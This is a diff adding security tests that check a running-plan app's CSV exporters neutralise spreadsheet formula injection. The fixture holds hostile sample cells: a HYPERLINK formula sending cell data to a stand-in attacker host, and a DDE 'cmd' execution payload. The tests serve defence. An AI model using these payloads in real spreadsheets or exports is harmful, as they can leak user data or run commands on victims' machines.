@@ -1,4 +1,4 @@
-import { parseCsv, workoutsToRunFlowCsv, type ParsedCsvWorkout } from '../csv-parser';
+import { parseCsv, workoutsToFinalSurgeCsv, workoutsToRunFlowCsv, workoutsToTrainingPeaksCsv, type ParsedCsvWorkout } from '../csv-parser';
 
 describe('RunFlow CSV metadata', () => {
     it('exports a plan metadata table before workout rows', () => {
@@ -47,5 +47,79 @@ describe('RunFlow CSV metadata', () => {
             paceSKm: 284,
             hrZone: 5,
         });
+    });
+});
+
+describe('CSV formula-injection neutralization (export builders)', () => {
+    // Cells an attacker controls through plan import (customName/description
+    // are stored verbatim) — the exported CSV must never let them evaluate as
+    // spreadsheet formulas.
+    const malicious: ParsedCsvWorkout = {
+        date: '2026-10-18',
+        workoutType: 'RACE',
+        name: '=HYPERLINK("http://attacker.example/pixel?c="&A2,"View pace chart")',
+        description: "=cmd|' /C calc'!A0",
+    };
+
+    it('neutralizes formula-leading name/description in all three export formats', () => {
+        const cases = [
+            workoutsToRunFlowCsv([malicious]),
+            workoutsToTrainingPeaksCsv([malicious]),
+            workoutsToFinalSurgeCsv([malicious]),
+        ];
+        for (const csv of cases) {
+            // Every quoted cell that begins with a formula trigger carries the
+            // apostrophe prefix in the raw bytes…
+            expect(csv).toContain('"\'=HYPERLINK(""http://attacker.example/pixel?c=""&A2,""View pace chart"")"');
+            expect(csv).toContain("\"'=cmd|' /C calc'!A0\"");
+            // …and contains no un-neutralized formula-leading quoted cell.
+            expect(csv).not.toMatch(/,"=[^"]/);
+        }
+    });
+
+    it('neutralizes formula-leading metadata values (goal name)', () => {
+        const csv = workoutsToRunFlowCsv([malicious], [
+            { section: 'Plan', field: 'Plan Name', value: '=SUM(1+1)*alert(1)' },
+        ]);
+        expect(csv).toContain('"\'=SUM(1+1)*alert(1)"');
+    });
+
+    it('leaves inert cells byte-identical to the old quote-doubling behavior', () => {
+        const inert: ParsedCsvWorkout = {
+            date: '2026-10-18',
+            workoutType: 'RACE',
+            name: 'Race Day',
+            description: 'Race Day: 21.1km',
+        };
+        expect(workoutsToRunFlowCsv([inert])).toContain('"Race Day","Race Day: 21.1km"');
+        expect(workoutsToTrainingPeaksCsv([inert])).toContain('"Race Day","Race Day: 21.1km"');
+        expect(workoutsToFinalSurgeCsv([inert])).toContain('"Race Day","Race Day: 21.1km"');
+    });
+
+    it('still roundtrips through parseCsv with formula cells present', () => {
+        const csv = workoutsToRunFlowCsv([malicious], [
+            { section: 'Plan', field: 'Generated At', value: '2026-05-27T10:00:00.000Z' },
+        ]);
+
+        const result = parseCsv(csv, 'runflow');
+
+        expect(result.errors).toEqual([]);
+        expect(result.workouts).toHaveLength(1);
+        // The apostrophe prefix survives the roundtrip: the parsed value is
+        // inert text, never a formula-leading string.
+        expect(result.workouts[0].name).toBe("'=HYPERLINK(\"http://attacker.example/pixel?c=\"&A2,\"View pace chart\")");
+        expect(result.workouts[0].description).toBe("'=cmd|' /C calc'!A0");
+    });
+
+    it('roundtrips TrainingPeaks and FinalSurge exports with formula cells', () => {
+        const tp = parseCsv(workoutsToTrainingPeaksCsv([malicious]), 'trainingpeaks');
+        const fs = parseCsv(workoutsToFinalSurgeCsv([malicious]), 'finalsurge');
+
+        for (const result of [tp, fs]) {
+            expect(result.errors).toEqual([]);
+            expect(result.workouts).toHaveLength(1);
+            expect(result.workouts[0].name.startsWith("'=")).toBe(true);
+            expect(result.workouts[0].description.startsWith("'=")).toBe(true);
+        }
     });
 });
